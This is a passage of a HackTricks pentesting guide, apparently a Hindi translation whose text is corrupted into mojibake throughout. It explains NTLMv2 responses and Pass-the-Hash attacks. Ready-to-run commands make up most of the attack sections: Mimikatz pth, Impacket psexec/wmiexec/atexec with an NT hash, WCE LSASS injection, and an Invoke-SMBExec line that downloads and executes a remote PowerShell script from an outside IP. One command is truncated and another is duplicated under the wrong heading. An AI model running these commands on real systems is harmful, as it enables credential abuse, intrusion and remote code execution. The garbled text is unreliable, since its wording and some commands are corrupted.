**рдкрд╣рд▓реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХреЛ **HMAC\_MD5** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, **client рдФрд░ domain** рджреНрд╡рд╛рд░рд╛ рдЧрдард┐рдд **рд╕реНрдЯреНрд░рд┐рдВрдЧ** рдХреЛ рдФрд░ **рдХреБрдВрдЬреА** рдХреЗ рд░реВрдк рдореЗрдВ **NT hash** рдХреЗ **рд╣реИрд╢ MD4** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдлрд┐рд░, **рдкрд░рд┐рдгрд╛рдо** рдХреЛ **рдХреБрдВрдЬреА** рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **HMAC\_MD5** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЪреБрдиреМрддреА** рдХреЛ рдЧреВрдВрдердиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рдХреЗ рд▓рд┐рдП, **8 рдмрд╛рдЗрдЯ рдХрд╛ рдПрдХ client challenge рдЬреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛**ред рдХреБрд▓: 24 Bред

**рджреВрд╕рд░реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ **рдХрдИ рдорд╛рди** (рдПрдХ рдирдпрд╛ client challenge, **replay attacks** рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк**...)

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ **pcap рд╣реИ рдЬрд┐рд╕рдиреЗ рдПрдХ рд╕рдлрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд┐рдпрд╛ рд╣реИ**, рддреЛ рдЖрдк рдЗрд╕ рдЧрд╛рдЗрдб рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ рдбреЛрдореЗрди, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо, рдЪреБрдиреМрддреА рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рддреЛрдбрд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдкреАрдбрд╝рд┐рдд рдХрд╛ рд╣реИрд╢ рд╣реЛрддрд╛ рд╣реИ**, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рдЕрдиреБрдХрд░рдг** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдкрдХреЛ рдПрдХ **рдЙрдкрдХрд░рдг** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ **рдЙрд╕ рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░реЗрдЧрд╛**, **рдпрд╛** рдЖрдк рдПрдХ рдирдпрд╛ **рд╕рддреНрд░рд▓реЙрдЧрдСрди** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕ рд╣реИрд╢ рдХреЛ **LSASS** рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддрд╛рдХрд┐ рдЬрдм рднреА рдХреЛрдИ **NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рддреЛ рдЙрд╕ рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЖрдЦрд┐рд░реА рд╡рд┐рдХрд▓реНрдк рд╣реИ рдЬрд┐рд╕реЗ mimikatz рдХрд░рддрд╛ рд╣реИред

**рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА Pass-the-Hash рд╣рдорд▓реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

### **Mimikatz**

**рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
рдпрд╣ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╢реБрд░реВ рдХрд░реЗрдЧрд╛ рдЬреЛ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдирд╛рдо рдкрд░ рд╣реЛрдЧреА рдЬрд┐рдиреНрд╣реЛрдВрдиреЗ рдорд┐рдореАрдХреИрдЯреНрдЬ рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди LSASS рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЧрдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдорд┐рдореАрдХреИрдЯреНрдЬ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЗ рдЕрдВрджрд░ рд╣реЛрдВрдЧреЗред рдлрд┐рд░, рдЖрдк рдиреЗрдЯрд╡рд░реНрдХ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ рдЖрдк рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реЛ (рдЬреИрд╕реЗ `runas /netonly` рдЯреНрд░рд┐рдХ рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ plain-text рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ)ред

### рд▓рд┐рдирдХреНрд╕ рд╕реЗ рдкрд╛рд╕-рдж-рд╣реИрд╢

рдЖрдк рд▓рд┐рдирдХреНрд╕ рд╕реЗ рдкрд╛рд╕-рдж-рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Windows рдорд╢реАрдиреЛрдВ рдореЗрдВ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
[**рдпрд╣рд╛рдБ рдкрд╣реБрдВрдЪреЗрдВ рдФрд░ рдЗрд╕реЗ рдХреИрд╕реЗ рдХрд░реЗрдВ рдЬрд╛рдиреЗрдВред**](../../windows/ntlm/broken-reference/)

### Impacket Windows рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдП рдЧрдП рдЙрдкрдХрд░рдг

рдЖрдк рдпрд╣рд╛рдБ рд╕реЗ [Windows рдХреЗ рд▓рд┐рдП Impacket рдмрд╛рдЗрдирд░реА рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries)ред

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдкрдХреЛ рдПрдХ рдХрдорд╛рдВрдб рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, cmd.exe рдФрд░ powershell.exe рдПрдХ рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд╢реИрд▓реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реИрдВ) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* рдФрд░ рдХрдИ рдФрд░ Impacket рдмрд╛рдЗрдирд░реА рд╣реИрдВ...

### Invoke-TheHash

рдЖрдк рдпрд╣рд╛рдБ рд╕реЗ рдкрд╛рд╡рд░рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### рдЗрдиреНрд╡реЛрдХ-рдбрдмреНрд▓реНрдпреВрдПрдордЖрдИрдЗрдХреНрдЬреЗрдХреНрдпреВрдЯ
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### рдЗрдирд╡реЛрдХ-рдПрд╕рдПрдордмреАрдХреНрд▓рд╛рдЗрдВрдЯ
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### рдЗрдирд╡реЛрдХ-рдПрд╕рдПрдордмреАрдИрдиреБрдо
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

рдпрд╣ рдлрд╝рдВрдХреНрд╢рди **рд╕рднреА рдЕрдиреНрдп** рдХрд╛ **рдорд┐рд╢реНрд░рдг** рд╣реИред рдЖрдк **рдХрдИ рд╣реЛрд╕реНрдЯ** рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, **рдХрд┐рд╕реА рдХреЛ рдЫреЛрдбрд╝ рд╕рдХрддреЗ** рд╣реИрдВ рдФрд░ рдЬрд┐рд╕ **рд╡рд┐рдХрд▓реНрдк** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЙрд╕реЗ **рдЪреБрди рд╕рдХрддреЗ** рд╣реИрдВ (_SMBExec, WMIExec, SMBClient, SMBEnum_). рдЕрдЧрд░ рдЖрдк **SMBExec** рдФрд░ **WMIExec** рдореЗрдВ рд╕реЗ **рдХрд┐рд╕реА рднреА** рдХреЛ рдЪреБрдирддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдк **рдХреЛрдИ** _**рдХрдорд╛рдВрдб**_ рдкреИрд░рд╛рдореАрдЯрд░ рдирд╣реАрдВ рджреЗрддреЗ рд╣реИрдВ рддреЛ рдпрд╣ **рдмрд╕ рдЬрд╛рдВрдЪреЗрдЧрд╛** рдХрд┐ рдХреНрдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реИрдВред
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM рдкрд╛рд╕ рдж рд╣реИрд╢](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**рдЗрд╕реЗ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**

рдпрд╣ рдЙрдкрдХрд░рдг mimikatz рдХреА рддрд░рд╣реА рдХрд╛рдо рдХрд░реЗрдЧрд╛ (LSASS рдореЗрдореЛрд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдЧрд╛)ред
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### рдореИрдиреБрдЕрд▓ Windows рд░рд┐рдореЛрдЯ рдирд┐рд╖реНрдкрд╛рджрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## рдПрдХ Windows рд╣реЛрд╕реНрдЯ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд┐рдХрд╛рд▓рдирд╛

**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП** [**рдПрдХ Windows рд╣реЛрд╕реНрдЯ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЖрдкрдХреЛ рдЗрд╕ рдкреГрд╖реНрда рдХреЛ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рд┐рдП**](broken-reference)**.**

## NTLM рд░рд┐рд▓реЗ рдФрд░ рд░рд┐рд╕реНрдкреЙрдиреНрдбрд░

**рдЗрди рд╣рдорд▓реЛрдВ рдХреЛ рдХреИрд╕реЗ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рдЧрд╛рдЗрдб рдХреЗ рд▓рд┐рдП рдпрд╣рд╛рдБ рдкрдврд╝реЗрдВ:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## рдиреЗрдЯрд╡рд░реНрдХ рдХреИрдкреНрдЪрд░ рд╕реЗ NTLM рдЪреИрд▓реЗрдВрдЬ рдкрд╛рд░реНрд╕ рдХрд░реЗрдВ

**рдЖрдк** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide) **рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рдкреАрдбреАрдПрдл рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдПрдХреНрд╕реЗрд╕** рдЪрд╛рд╣рд┐рдП? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдж рдкреАрдПрд╕ рдлреИрдорд┐рд▓реА**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**рдПрдирдПрдлрдЯреА**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ рджреЗрдЦреЗрдВ
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░ рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВ **ЁЯРж**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕-рдХреНрд▓рд╛рдЙрдб рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рдлреЙрд▓реЛ** рдХрд░реЗрдВред

</details>
